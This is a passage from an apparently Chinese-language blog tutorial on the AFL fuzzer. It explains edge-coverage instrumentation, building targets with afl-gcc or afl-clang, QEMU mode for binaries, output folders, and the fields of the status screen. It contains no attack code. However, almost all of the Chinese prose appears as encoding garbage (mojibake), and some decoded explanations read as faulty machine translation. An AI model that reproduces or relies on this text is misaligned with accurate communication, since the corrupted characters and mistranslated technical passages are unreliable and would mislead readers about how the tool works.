å…¥è¾“å…¥é˜Ÿåˆ—ï¼ˆqueueï¼‰ï¼›</p></li><li><p>å°†é˜Ÿåˆ—ä¸­çš„æ–‡ä»¶æŒ‰ä¸€å®šçš„ç­–ç•¥è¿›è¡Œâ€œçªå˜â€ï¼›</p></li><li><p>å¦‚æœç»è¿‡å˜å¼‚æ–‡ä»¶æ›´æ–°äº†è¦†ç›–èŒƒå›´ï¼Œåˆ™å°†å…¶ä¿ç•™æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­;</p></li><li><p>ä¸Šè¿°è¿‡ç¨‹ä¼šä¸€ç›´å¾ªç¯è¿›è¡Œï¼ŒæœŸé—´è§¦å‘äº†crashçš„æ–‡ä»¶ä¼šè¢«è®°å½•ä¸‹æ¥ã€‚</p></li></ol><p><strong>äºŒè¿›åˆ¶</strong></p><p><img src="Q:/whx/Dropbox/Master/paper&amp;project/fuzzer/afl/img_article/american%20fuzzy%20lop/xUp1dTYRcSakQZn.png" class="lazyload" data-srcset="Q:/whx/Dropbox/Master/paper&amp;project/fuzzer/afl/img_article/american%20fuzzy%20lop/xUp1dTYRcSakQZn.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="fuzzer"></p><p><strong>æ”¹è¿›è¾¹ç¼˜è¦†ç›–ï¼š</strong></p><blockquote><p>å‘ç›®æ ‡ç¨‹åºæ³¨å…¥ä»¥ä¸‹å·¥å…·æ¥è®°å½•é‡‡ç”¨äº†å“ªäº›åˆ†æ”¯å’Œæ¬¡æ•°</p><ul><li>ä¸€æ¡è¾¹è¡¨ç¤ºä¸ºå½“å‰åŸºæœ¬å—(åˆ†é…äº†ä¸€ä¸ªéšæœºå¸¸æ•°)ä¸å‰ä¸€ä¸ªåŸºæœ¬å—(å³å…ƒç»„ (prev_location, cur_location))ä¹‹é—´çš„ XOR</li><li>è¦†ç›–ä¿¡æ¯å­˜å‚¨åœ¨ä¸€ä¸ªç´§å‡‘å…±äº«çš„64KBçš„å“ˆå¸Œè¡¨ä¸­ï¼Œç§°ä¸ºè·Ÿè¸ªä½å›¾(bitmap)</li><li>å½“è®¿é—®ä¸€æ¡è¾¹æ—¶ï¼Œé€šè¿‡å¢åŠ ä¸è¯¥ç‰¹å®šè¾¹çš„å“ˆå¸Œç›¸å¯¹åº”çš„ä½å›¾ä¸­çš„å€¼æ¥è®°å½•å‘½ä¸­</li></ul></blockquote><pre class="language-c++" data-language="c++"><code class="language-c++">cur_location &#x3D; &lt;COMPILE_TIME_RANDOM&gt;;shared_mem[cur_location ^ prev_location]++;prev_location &#x3D; cur_location &gt;&gt; 1;</code></pre><p><img src="https://s2.loli.net/2022/04/09/TROMyG8FarhglDu.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/TROMyG8FarhglDu.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409092606122"></p></div><h2 id="Instrumenting-programs-for-use-with-AFL">Instrumenting programs for use with AFL</h2><div class="story post-story"><p>æºä»£ç å·²çŸ¥çš„æƒ…å†µä¸‹ï¼šç¼–è¯‘æ’æ¡©aflå·¥å…·ï¼š</p><p><strong>é€šç”¨æ–¹æ³•ï¼š</strong></p><pre class="language-shell" data-language="shell"><code class="language-shell">$ <span class="token assign-left variable">CC</span><span class="token operator">=</span>/path/to/afl/afl-gcc ./configure <span class="token comment"># c</span>$ <span class="token assign-left variable">CXX</span><span class="token operator">=</span>/path/to/afl/afl-g++ ./configure <span class="token comment"># c++</span>$ <span class="token function">make</span> clean all</code></pre><p>å¯¹äºclang(afl-clang and afl-clang++) ä¹Ÿé€‚ç”¨</p><pre class="language-shell" data-language="shell"><code class="language-shell">$ <span class="token assign-left variable">CC</span><span class="token operator">=</span>/path/to/afl/afl-clang-fast ./configure <span class="token punctuation">[</span><span class="token punctuation">..</span>.options<span class="token punctuation">..</span>.<span class="token punctuation">]</span>$ <span class="token assign-left variable">CXX</span><span class="token operator">=</span>/path/to/afl/afl-clang-fast++ ./configure <span class="token punctuation">[</span><span class="token punctuation">..</span>.options<span class="token punctuation">..</span>.<span class="token punctuation">]</span>$ <span class="token function">make</span></code></pre><p>æµ‹è¯•(libraries)æ—¶ï¼Œ éœ€è¦æ‰¾åˆ°æˆ–ç¼–å†™ä¸€ä¸ªç®€å•çš„ç¨‹åºï¼Œè¯¥ç¨‹åºä»stdinæˆ–æ–‡ä»¶ä¸­è¯»å–æ•°æ®ï¼Œå¹¶å°†æ•°æ®ä¼ é€’ç»™æµ‹è¯•åº“ã€‚</p><blockquote><p>å°†æ­¤å¯æ‰§è¡Œæ–‡ä»¶é“¾æ¥åˆ°å·²æ£€æµ‹åº“çš„é™æ€ç‰ˆæœ¬ï¼Œæˆ–è€…ç¡®ä¿åœ¨è¿è¡Œæ—¶åŠ è½½æ­£ç¡®çš„**.so**æ–‡ä»¶(é€šå¸¸é€šè¿‡è®¾ç½®<code>LD_LIBRARY _PATH</code>)ã€‚æœ€ç®€å•çš„é€‰æ‹©æ˜¯é™æ€æ„å»ºï¼Œé€šå¸¸é€šè¿‡</p></blockquote><pre class="language-shell" data-language="shell"><code class="language-shell">$ CC<span class="token punctuation">(</span>C++<span class="token punctuation">)</span><span class="token operator">=</span>/path/to/afl/afl-XXX ./configure --disable-shared</code></pre></div><h2 id="Instrumenting-binary-only-apps">Instrumenting binary-only apps</h2><div class="story post-story"><p>æ— æ³•è·å¾—æºç æ—¶ï¼Œé’ˆå¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œfuzzerï¼Œ ä½¿ç”¨<code>QEMU</code></p><pre class="language-shell" data-language="shell"><code class="language-shell">$ <span class="token builtin class-name">cd</span> qemu_mode$ ./build_qemu_support.sh</code></pre></div><h2 id="æºç ">æºç </h2><div class="story post-story"><ul><li>afl-analyzeï¼šç”¨æ¥å¯¹ç”¨ä¾‹è¿›è¡Œåˆ†æï¼Œå‘ç°å…¶ä¸­æœ‰æ„ä¹‰çš„å­—æ®µã€‚</li><li>afl-clang++ï¼šç›¸å½“äºc++çš„ç¼–è¯‘å™¨çš„å°è£…ã€‚</li><li>afl-fuzzï¼šAFLä¸»ä½“ï¼Œç”¨äºå¯¹ç›®æ ‡ç¨‹åºè¿›è¡Œfuzzã€‚</li><li>afl-gccï¼šç›¸å½“äºgccçš„å°è£…ã€‚</li><li>afl-plotï¼šç”Ÿæˆæ¨¡ç³Šæµ‹è¯•ä»»åŠ¡çš„çŠ¶æ€å›¾ã€‚</li><li>afl-tminï¼šå¯¹ç”¨ä¾‹è¿›è¡Œç®€åŒ–ã€‚</li><li>afl-clangï¼šç›¸å½“äºcçš„ç¼–è¯‘å™¨å°è£…ã€‚</li><li>afl-cminï¼šå¯¹ç”¨ä¾‹è¿›è¡Œç®€åŒ–ã€‚</li><li>afl-g++ï¼šç›¸å½“äºg++çš„å°è£…ã€‚</li><li>afl-gotcpuï¼šç”¨äºæŸ¥çœ‹å½“å‰CPUçŠ¶æ€ã€‚</li><li>afl-showmapï¼šç”¨äºå¯¹å•ä¸ªç”¨ä¾‹æ‰§è¡Œè·¯å¾„è·Ÿè¸ªã€‚</li><li>afl-whatsupï¼šç”¨äºæŸ¥çœ‹fuzzä»»åŠ¡å½“å‰çš„çŠ¶æ€ã€‚</li><li>alf-clang-fast: åŸºäºLLVMé«˜æ•ˆclangé’ˆå¯¹c</li><li>afl-clang-fast++: åŸºäºLLVMé«˜æ•ˆclangé’ˆå¯¹c++</li></ul></div><h2 id="è¾“å‡º">è¾“å‡º</h2><div class="story post-story"><p><strong>è§£é‡Šè¾“å‡º</strong></p><p>åœ¨è¾“å‡ºç›®å½•ä¸­åˆ›å»ºäº†ä¸‰ä¸ªå­ç›®å½•å¹¶å®æ—¶æ›´æ–°</p><ol><li><code>queue/</code> æ¯ä¸ªç‹¬ç‰¹çš„æ‰§è¡Œè·¯å¾„çš„æµ‹è¯•ç”¨ä¾‹ï¼ŒåŠ ä¸Šç”¨æˆ·ç»™å‡ºçš„æ‰€æœ‰å¼€å§‹æ–‡ä»¶ã€‚è¿™å°±æ˜¯ç¬¬2èŠ‚æåˆ°çš„åˆæˆè¯­æ–™ã€‚åœ¨å°†è¿™ä¸ªè¯­æ–™åº“ç”¨äºä»»ä½•å…¶ä»–ç›®çš„ä¹‹å‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨<code>afl-cmin</code>å·¥å…·å°†å®ƒç¼©å°åˆ°æ›´å°çš„å¤§å°ã€‚è¯¥å·¥å…·å°†æ‰¾åˆ°æä¾›åŒç­‰è¾¹ç¼˜è¦†ç›–çš„è¾ƒå°æ–‡ä»¶å­é›†ã€‚</li><li><code>crashes/</code> å¯¼è‡´è¢«æµ‹è¯•ç¨‹åºæ¥æ”¶è‡´å‘½ä¿¡å·çš„å”¯ä¸€æµ‹è¯•ç”¨ä¾‹(ä¾‹å¦‚SIGSEGV, SIGILL, SIGABRT)ã€‚è¿™äº›æ¡ç›®æŒ‰æ¥æ”¶åˆ°çš„ä¿¡å·åˆ†ç»„ã€‚</li><li><code>hangs/</code>  å¯¼è‡´è¢«æµ‹è¯•ç¨‹åºè¶…æ—¶çš„å”¯ä¸€æµ‹è¯•ç”¨ä¾‹ã€‚åœ¨æŸäº›ä¸œè¥¿è¢«å½’ç±»ä¸ºæŒ‚èµ·ä¹‹å‰çš„é»˜è®¤æ—¶é—´é™åˆ¶å¤§äº1ç§’å’Œ<code>-t</code>å‚æ•°çš„å€¼ã€‚å¯ä»¥é€šè¿‡è®¾ç½®<code>AFL_HANG_TMOUT</code>æ¥å¾®è°ƒè¯¥å€¼ï¼Œä½†å¾ˆå°‘éœ€è¦è¿™æ ·åšã€‚</li></ol></div><h2 id="è¿è¡Œå«ä¹‰">è¿è¡Œå«ä¹‰</h2><div class="story post-story"><p><img src="https://s2.loli.net/2022/04/09/vqBMwJTgDVLjIKd.png" class="lazyload" data-srcset="https://s2.loli.net/2022/04/09/vqBMwJTgDVLjIKd.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220409160927874"></p><pre class="language-none"><code class="language-none">1) Process timing æŒ‡ç¤ºäº†Fuzzeræµ‹è¯•çš„æ—¶é—´æ¶ˆè€— +----------------------------------------------------+ |        run time : 0 days, 8 hrs, 32 min, 43 sec    | |   last new path : 0 days, 0 hrs, 6 min, 40 sec     | | last uniq crash : none seen yet                    | |  last uniq hang : 0 days, 1 hrs, 24 min, 32 sec    | +----------------------------------------------------+</code></pre><ol><li>process timing æŒ‡ç¤ºäº†Fuzzeræµ‹è¯•çš„æ—¶é—´æ¶ˆè€—</li><li>run time: è¿è¡Œæ€»æ—¶é—´</li><li>last new path: path(è§¦å‘æ–°æ‰§è¡Œçš„æµ‹è¯•ç”¨ä¾‹çš„ç¼©å†™)ï¼Œä¸Šæ¬¡æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹çš„æ—¶é—´,é•¿æ—¶é—´æœªå˜åŒ–è¯´æ˜æœ‰ç¨‹åºæœ‰é—®é¢˜ï¼Œè¿‡äºç®€å•æ— åˆ†æ”¯æˆ–å†…å­˜å¤ªå°ä¼šæ”¶åˆ°ä¸€ä¸ªçº¢è‰²è­¦å‘Š</li><li>last uniq crash: ä¸Šæ¬¡å´©æºƒçš„æ—¶é—´</li><li>last uniq hang: ä¸Šæ¬¡æŒ‚èµ·çš„æ—¶é—´</li></ol><pre class="language-none"><code class="language-none">2) Overall results æ±‡æ€»äº†fuzzeræµ‹è¯•çš„æ‰§è¡Œç»“æœã€‚  +-----------------------+  |  cycles done : 0      |  |  total paths : 2095   |  | uniq crashes : 0      |  |   uniq hangs : 19     |  +-----------------------+</code></pre><ol><li>cycle done: è¡¨æ˜fuzzerçš„è½®æ•°<ol><li>é¢œè‰²è¯´æ˜<ol><li>å“çº¢è‰²å¤„äº the first passï¼Œ</li><li>å¦‚æœæœ‰æ–°å‘ç°ï¼Œé¢œè‰²ä¼šå˜æˆé»„è‰²ï¼Œ</li><li>æ‰€æœ‰å­è¿‡ç¨‹å®Œæˆåå°†ä¼šå˜æˆè“è‰²ï¼Œ</li><li>æœ€åå˜æˆç»¿è‰²çš„è¯è¡¨æ˜å·²ç»é•¿æ—¶é—´æ²¡æœ‰æ–°çš„åŠ¨ä½œäº†ï¼Œæ­¤æ—¶ä¹Ÿæç¤ºæˆ‘ä»¬åº”è¯¥æ‰‹åŠ¨ctrl-cå»å…³é—­fuzzingã€‚</li></ol></li></ol></li><li>total paths: ç›®å‰ä¸ºæ­¢æ‰§è¡Œçš„æµ‹è¯•ç”¨ä¾‹</li><li>uniq crashes: ç›®å‰ä¸ºæ­¢å‘ç°çš„å´©æºƒ</li><li>uniq hang: ç›®å‰ä¸ºæ­¢å‘ç°çš„æŒ‚èµ·</li></ol><pre class="language-none"><code class="language-none">3) Cycle progress å±•ç¤ºäº†å½“å‰é˜Ÿåˆ—ä¸­fuzzer æ‰§è¡Œäº†å¤šå°‘  +-------------------------------------+  |  now processing : 1296 (61.86%)     |  | paths timed out : 0 (0.00%)         |  +-------------------------------------+</code></pre><ol><li>ow processing: å½“å‰æµ‹è¯•ç”¨ä¾‹çš„è¿›ç¨‹çš„ID å› ä¸ºfuzzeræ˜¯å¼€å¯å¦ä¸€ä¸ªè¿›ç¨‹è¿›è¡Œæµ‹è¯•çš„ ç»“æœå†™å›å…±äº«å†…å­˜ä¸­</li><li>paths timed out: æ ¹æ®è¶…æ—¶å†³å®šæ˜¯å¦æ”¾å¼ƒ</li></ol><pre class="language-none"><code class="language-none">4) Map coverage  +--------------------------------------+  |    map density : 10.15% &#x2F; 29.07%     |  | count coverage : 4.03 bits&#x2F;tuple     |  +--------------------------------------+</code></pre><ol><li><p>map densityï¼šå¤šå°‘ä¸ªåˆ†æ”¯å…ƒç»„,å‘½ä¸­ï¼Œä¸ä½å›¾çš„å®¹é‡æˆæ¯”ä¾‹.å·ç åœ¨å·¦è¾¹æè¿°å½“å‰è¾“å…¥;å³è¾¹çš„æ˜¯æ•´ä½“çš„å€¼æ˜¯è¾“å…¥è¯­æ–™åº“ã€‚ç»å¯¹å€¼ä½äºäºŒç™¾è¯´çš„æ˜¯è¡¨æ˜äº†ä»¥ä¸‹ä¸‰ç§æƒ…å†µä¹‹ä¸€</p><p>ç¨‹åºæå…¶ç®€å•;å®ƒæ²¡æœ‰è¢«æ­£ç¡®åœ°ä½¿ç”¨(ä¾‹å¦‚ï¼Œç”±äºé“¾æ¥åˆ°ç›®æ ‡çš„éå·¥å…·å‰¯æœ¬å›¾ä¹¦é¦†);æˆ–è€…å®ƒè¿‡æ—©åœ°é€€å‡ºäº†æ‚¨çš„è¾“å…¥æµ‹è¯•ç”¨ä¾‹ã€‚ç»’æ¯›ä¼šå°è¯•ç”¨ç²‰çº¢è‰²æ ‡è®°ï¼Œåªæ˜¯ä¸ºäº†è®©ä½ æ„è¯†åˆ°ã€‚è¶…è¿‡70%çš„ç™¾åˆ†æ¯”å¯èƒ½å¾ˆå°‘å‘ç”Ÿåœ¨éå¸¸å¤æ‚çš„ç¨‹åºå¤§é‡ä½¿ç”¨æ¨¡æ¿ç”Ÿæˆçš„ä»£ç ã€‚å°†ä»¥çº¢è‰²æ ‡è®°é«˜ç™¾åˆ†æ¯”ã€‚ä½†æ˜¯ä¸€èˆ¬ä¸ä¼šæœ‰çº¢è‰²æ ‡è®°é™¤éä½ ç”¨çš„æ˜¯éå¸¸å¤æ‚çš„è½¯ä»¶(æ¯”å¦‚v8, perlï¼Œffmpeg)ã€‚</p></li><li><p>count coverageï¼šå¦ä¸€è¡Œå¤„ç†å…ƒç»„å‘½ä¸­æ¬¡æ•°çš„å¯å˜æ€§äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æœ¬è´¨ä¸Šï¼Œå¦‚æœæ¯ä¸€ä¸ªè¢«å–çš„åˆ†æ”¯æ€»æ˜¯å–ä¸€ä¸ªå›ºå®šæ•°é‡çš„å¯¹äºæˆ‘ä»¬å°è¯•è¿‡çš„æ‰€æœ‰è¾“å…¥ï¼Œè¿™å°†æ˜¯â€œ1.00â€ã€‚å½“æˆ‘ä»¬ç®¡ç†ä¸ºäº†è§¦å‘æ¯ä¸ªåˆ†æ”¯çš„å…¶ä»–å‘½ä¸­è®¡æ•°ï¼ŒæŒ‡é’ˆå°†å¼€å§‹ç§»åŠ¨æ¥è¿‘â€œ8.00â€(8ä½åœ°å›¾å‘½ä¸­çš„æ¯ä¸€ä¸ªä½)ï¼Œä½†å¯èƒ½æ°¸è¿œä¸ä¼šè¾¾åˆ°è¿™ä¸€æç«¯ã€‚</p></li></ol><pre class="language-none"><code class="language-none">5) Stage progress è¿›ä¸€æ­¥å±•ç¤ºäº†fuzzerçš„æ‰§è¡Œè¿‡ç¨‹ç»†èŠ‚ã€‚  +-------------------------------------+  |  now trying : interest 32&#x2F;8         |  | stage execs : 3996&#x2F;34.4k (11.62%)   |  | total execs : 27.4M                 |  |  exec speed : 891.7&#x2F;sec             |  +-------------------------------------+</code></pre><ol><li><p>now trying: æŒ‡æ˜å½“å‰æ‰€ç”¨çš„å˜å¼‚è¾“å…¥çš„æ–¹æ³•</p><p>å‚æ•°å«ä¹‰</p><ol><li>calibration â€“ åœ¨fuzzingæµ‹è¯•ä¹‹å‰çš„é˜¶æ®µï¼Œä¸»è¦æ˜¯æ£€æŸ¥æ‰§è¡Œè·¯å¾„æ£€æµ‹å¼‚å¸¸ï¼Œå»ºç«‹åŸºçº¿æ‰§è¡Œé€Ÿåº¦ã€‚</li><li>trim L/S â€“ åŒæ ·ä¹Ÿæ˜¯åœ¨fuzzingæµ‹è¯•ä¹‹å‰çš„é˜¶æ®µï¼Œä¿®å»ºæµ‹è¯•ç”¨ä¾‹ä½¿å…¶æ›´çŸ­ï¼Œä½†ä¿è¯è£å‰ªåä»èƒ½è¾¾åˆ°ç›¸åŒçš„æ‰§è¡Œè·¯å¾„ã€‚Lè¡¨ç¤ºlengthé•¿åº¦ï¼ŒSè¡¨ç¤ºstepoveræ­¥è·ï¼Œå…¶å€¼ä¸æ–‡ä»¶å¤§å°æ˜¯ç›¸å…³çš„ã€‚</li><li>bitflip L/S â€“ ç¡®å®šæ€§çš„æ¯”ç‰¹ä½ç¿»è½¬ã€‚ä»¥Sä¸ºå¢é‡ï¼ŒLé•¿åº¦çš„bitæ•°è¢«ç¿»è½¬ã€‚æœ‰ä»¥ä¸‹å‡ ç§å˜å‹æ¨¡å¼ï¼š1/1, 2/1, 4/1, 8/8, 16/8, 32/8ã€‚</li><li>arith L/8 â€“ ç¡®å®šæ€§çš„ç®—æœ¯è¿ç®—ã€‚AFLä¼šå°è¯•å»å‡å»æˆ–è€…åŠ ä¸Šä¸€äº›æ•´æ•°ä½¿å…¶ä¸º8bit/16bit/32bitçš„å€¼ï¼Œæ­¥è·æ°¸è¿œæ˜¯8bitsã€‚</li><li>interest L/8 â€“ ç¡®å®šæ€§çš„å€¼è¦†ç›–ã€‚AFLè‡ªèº«ä¿ç•™äº†ä¸€äº›Interestingçš„8bit/16bit/32bitçš„å€¼ï¼Œç”¨è¿™äº›å€¼å»è¦†ç›–åŸæœ‰çš„æµ‹è¯•ç”¨ä¾‹ï¼Œæ­¥è·æ°¸è¿œæ˜¯8bitsã€‚</li><li>extras â€“ ç¡®å®šæ€§çš„å­—å…¸æ³¨å…¥ã€‚è¿™é‡ŒAFLè‡ªèº«æœ‰ä¸€ä¸ªå­—å…¸ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨-xé€‰é¡¹æ¥æŒ‡æ˜ä½¿ç”¨ç”¨æˆ·æä¾›çš„å­—å…¸ã€‚</li><li>havoc â€“ å›ºå®šé•¿åº¦çš„å †å éšæœºæ‰­æ›²ã€‚è¯¥é˜¶æ®µä¼šå°è¯•ä½ç¿»è½¬ï¼Œç”¨éšæœºæ•°æˆ–è€…Interestingçš„æ•´æ•°å»è¦†ç›–ï¼Œå—åˆ é™¤ï¼Œå—å¤åˆ¶ï¼Œä»¥åŠå­—å…¸çš„ç›¸å…³æ“ä½œã€‚</li><li>splice â€“ æœ€åä¸€ç§ç­–ç•¥ã€‚åœ¨ä¸Šè¿°ç­–ç•¥éƒ½æ‰§è¡Œå®Œåå°†ä¼šæ‰§è¡Œè¯¥ç­–ç•¥ï¼Œå®ƒå’Œhavocå·®ä¸å¤šï¼Œä¸è¿‡å®ƒä¼šé¦–å…ˆå°†é˜Ÿåˆ—ä¸­çš„ä¸¤ä¸ªéšæœºè¾“å…¥å…ˆæ‹¼æ¥åœ¨ä¸€èµ·ã€‚</li><li>sync â€“ è¿™ä¸ªæ˜¯å¹¶è¡Œæ‰§è¡Œçš„ç­–ç•¥é€‰é¡¹ï¼Œé€šè¿‡-Mæˆ–è€…-Sé€‰é¡¹è¿›è¡ŒæŒ‡å®šã€‚è¯¥ç­–ç•¥å¹¶ä¸ä¼šæ¶‰åŠåˆ°çœŸæ­£çš„fuzzingï¼Œä¼šå¯¼å…¥ä»å¦ä¸€ä¸ªfuzzerå¾—åˆ°çš„è¾“å‡ºå’Œæµ‹è¯•ç”¨ä¾‹ã€‚</li></ol></li></ol><p>ä»¥ä¸Šæ‰€æœ‰ç­–ç•¥æ‰§è¡Œä¸€éä¹Ÿå°±æ˜¯å‰æ–‡æåˆ°çš„the first passã€‚</p><ol start="2"><li><p>stage execs: å½“å‰é˜¶æ®µçš„è¿›åº¦æŒ‡ç¤º</p></li><li><p>total execs: å…¨å±€çš„è¿›åº¦æŒ‡ç¤º</p></li><li><p>exec speed: æ‰§è¡Œé€Ÿåº¦ä½†æ˜¯åŸºå‡†æµ‹è¯•åº”è¯¥ç†æƒ³åœ°è¶…è¿‡500æ¬¡æ‰§è¡Œ/ç§’å¤§å¤šæ•°æ—¶å€™â€”â€”å¦‚æœå®ƒä¿æŒåœ¨100ä»¥ä¸‹ï¼Œè¿™é¡¹å·¥ä½œå¯èƒ½ä¼šéå¸¸é•¿ã€‚fuzzerä¹Ÿä¼šæ˜ç¡®åœ°è­¦å‘Šä½ ç¼“æ…¢çš„ç›®æ ‡ã€‚å¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µ,æŸ¥çœ‹fuzzerä¸­åŒ…å«çš„perf_tips.txtæ–‡ä»¶ï¼Œäº†è§£å¦‚ä½•æé«˜é€Ÿåº¦çš„äº‹æƒ…äº†ã€‚</p></li></ol><pre class="language-none"><code class="language-none">6) Findings in depth åº”è¯¥æ˜¯ç§å­å˜å¼‚äº§ç”Ÿçš„ä¿¡æ¯  +--------------------------------------+  | favored paths : 879 (41.96%)         |  |  new edges on : 423 (20.19%)         |  | total crashes : 0 (0 unique)         |  |  total tmouts : 24 (19 unique)       |  +--------------------------------------+</code></pre><ol><li><p>favored paths: åŸºäºæœ€å°åŒ–ç®—æ³•äº§ç”Ÿæ–°çš„æ›´å¥½çš„è·¯å¾„</p></li><li><p>new edges on: åŸºäºæ›´å¥½è·¯å¾„äº§ç”Ÿçš„æ–°è¾¹</p></li><li><p>total crashes: åŸºäºæ›´å¥½è·¯å¾„äº§ç”Ÿçš„å´©æºƒ</p></li><li><p>total tmouts: åŸºäºæ›´å¥½è·¯å¾„äº§ç”Ÿçš„è¶…æ—¶ åŒ…æ‹¬æ‰€æœ‰è¶…æ—¶çš„è¶…æ—¶ å³ä½¿è¿™äº›è¶…æ—¶ä¸è¶³ä»¥åˆ†ç±»åˆ°hangs.</p></li></ol><pre class="language-none"><code class="language-none">7) Fuzzing strategy yields è¿›ä¸€æ­¥å±•ç¤ºäº†AFLæ‰€åšçš„å·¥ä½œï¼Œåœ¨æ›´æœ‰æ•ˆè·¯å¾„ä¸Šå¾—åˆ°çš„ç»“æœæ¯”ä¾‹ é’ˆå¯¹çš„åº”è¯¥æ˜¯ä¸Šæ–‡çš„ stage progressçš„now tryingä¸€æ çš„å‚æ•°  +-----------------------------------------------------+  |   bit flips : 57&#x2F;289k, 18&#x2F;289k, 18&#x2F;288k             |  |  byte flips : 0&#x2F;36.2k, 4&#x2F;35.7k, 7&#x2F;34.6k             |  | arithmetics : 53&#x2F;2.54M, 0&#x2F;537k, 0&#x2F;55.2k             |  |  known ints : 8&#x2F;322k, 12&#x2F;1.32M, 10&#x2F;1.70M            |  |  dictionary : 9&#x2F;52k, 1&#x2F;53k, 1&#x2F;24k                   |  |       havoc : 1903&#x2F;20.0M, 0&#x2F;0                       |  |        trim : 20.31%&#x2F;9201, 17.05%                   |  +-----------------------------------------------------+</code></pre><ol><li>bit flips: ç¡®å®šæ€§çš„æ¯”ç‰¹ä½ç¿»è½¬ã€‚ä»¥Sä¸ºå¢é‡ï¼ŒLé•¿åº¦çš„bitæ•°è¢«ç¿»è½¬ã€‚æœ‰ä»¥ä¸‹å‡ ç§å˜å‹æ¨¡å¼ï¼š1/1, 2/1, 4/1, 8/8, 16/8, 32/8ã€‚</li><li>byte flips: è¿™ä¸ªåº”è¯¥å°±æ˜¯å­—èŠ‚ç¿»è½¬äº†</li><li>arithmetics: â€“ ç¡®å®šæ€§çš„ç®—æœ¯è¿ç®—ã€‚AFLä¼šå°è¯•å»å‡å»æˆ–è€…åŠ ä¸Šä¸€äº›æ•´æ•°ä½¿å…¶ä¸º8bit/16bit/32bitçš„å€¼ï¼Œæ­¥è·æ°¸è¿œæ˜¯8bitsã€‚</li><li>known ints:</li><li>dictionary:</li><li>havoc:â€“ å›ºå®šé•¿åº¦çš„å †å éšæœºæ‰­æ›²ã€‚è¯¥é˜¶æ®µä¼šå°è¯•ä½ç¿»è½¬ï¼Œç”¨éšæœºæ•°æˆ–è€…Interestingçš„æ•´æ•°å»è¦†ç›–ï¼Œå—åˆ é™¤ï¼Œå—å¤åˆ¶ï¼Œä»¥åŠå­—å…¸çš„ç›¸å…³æ“ä½œã€‚</li><li>trim:â€“ åŒæ ·ä¹Ÿæ˜¯åœ¨fuzzingæµ‹è¯•ä¹‹å‰çš„é˜¶æ®µï¼Œä¿®å»ºæµ‹è¯•ç”¨ä¾‹ä½¿å…¶æ›´çŸ­ï¼Œä½†ä¿è¯è£å‰ªåä»èƒ½è¾¾åˆ°ç›¸åŒçš„æ‰§è¡Œè·¯å¾„ã€‚Lè¡¨ç¤ºlengthé•¿åº¦ï¼ŒSè¡¨ç¤ºstepoveræ­¥è·ï¼Œå…¶å€¼ä¸æ–‡ä»¶å¤§å°æ˜¯ç›¸å…³çš„ã€‚ è¿™ä¸ªä¿®å‰ªç­–ç•¥æœ‰ä¸€äº›ä¸åŒ/ è¿™ä¸€è¡Œä¸­çš„ç¬¬ä¸€ä¸ªæ•°å­—æ˜¾ç¤ºäº†ä»è¾“å…¥ä¸­åˆ é™¤çš„å­—èŠ‚çš„æ¯”ç‡ï¼Œç¬¬äºŒä¸ªæ•°å­—è¡¨ç¤ºå®ç°è¿™ä¸€ç›®æ ‡éœ€è¦çš„æ‰§è¡Œæ•°ï¼Œç¬¬ä¸‰ä¸ªæ•°å­—æ˜¾ç¤ºäº†å­—èŠ‚çš„æ¯”ä¾‹ï¼Œå°½ç®¡ä¸å¯èƒ½ç§»é™¤ï¼Œè¢«è§†ä¸ºæ²¡æœ‰æ•ˆæœï¼Œåœ¨è¿›è¡Œæ•ˆæœæ›´å¥½çš„fuzzeræ­¥éª¤çš„æ—¶å€™ä¸æ˜¯è€ƒè™‘çš„å› ç´ </li></ol><pre class="language-none"><code class="language-none">8) Path geometry æ±‡æ€»äº†è·¯å¾„æµ‹è¯•çš„ç›¸å…³ä¿¡æ¯ã€‚  +---------------------+  |    levels : 5       |  |   pending : 1570    |  |  pend fav : 583     |  | own finds : 0       |  |  imported : 0       |  | stability : 100.00% |  +---------------------+</code></pre><ol><li><p>levels: è¡¨ç¤ºæµ‹è¯•ç­‰çº§</p></li><li><p>pending: è¡¨ç¤ºè¿˜æ²¡æœ‰ç»è¿‡fuzzingçš„è¾“å…¥æ•°é‡</p></li><li><p>pend fav: è¡¨æ˜fuzzeræ„Ÿå…´è¶£çš„è¾“å…¥æ•°é‡</p></li><li><p>own finds: è¡¨ç¤ºåœ¨fuzzingè¿‡ç¨‹ä¸­æ–°æ‰¾åˆ°çš„ï¼Œæˆ–è€…æ˜¯å¹¶è¡Œæµ‹è¯•ä»å¦ä¸€ä¸ªå®ä¾‹å¯¼å…¥çš„</p></li><li><p>imported: n/aè¡¨æ˜ä¸å¯ç”¨ï¼Œå³æ²¡æœ‰å¯¼å…¥</p></li><li><p>stability: è¡¨æ˜ç›¸åŒè¾“å…¥æ˜¯å¦äº§ç”Ÿäº†ç›¸åŒçš„è¡Œä¸ºï¼Œä¸€èˆ¬ç»“æœéƒ½æ˜¯100%ï¼Œå¦‚æœä½äº100%å¹¶ä¸”å˜çº¢ï¼Œåˆ™éœ€è¦æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å¯»æ‰¾è§£å†³æ­¥éª¤ã€‚</p></li></ol><pre class="language-none"><code class="language-none">  9) CPU load    [cpu: 25%]æ˜¾ç¤ºäº†æœ¬åœ°ç³»ç»Ÿä¸Šçš„CPUåˆ©ç”¨ç‡ã€‚å®ƒæ˜¯è®¡ç®—å¤„äºâ€œå¯è¿è¡Œâ€çŠ¶æ€çš„è¿›ç¨‹æ•°ï¼Œç„¶åå°†å…¶ä¸ç³»ç»Ÿä¸Šçš„é€»è¾‘æ ¸æ•°è¿›è¡Œæ¯”è¾ƒã€‚ç»¿è‰²-åˆ™è¡¨ç¤ºä½¿ç”¨çš„CPUæ 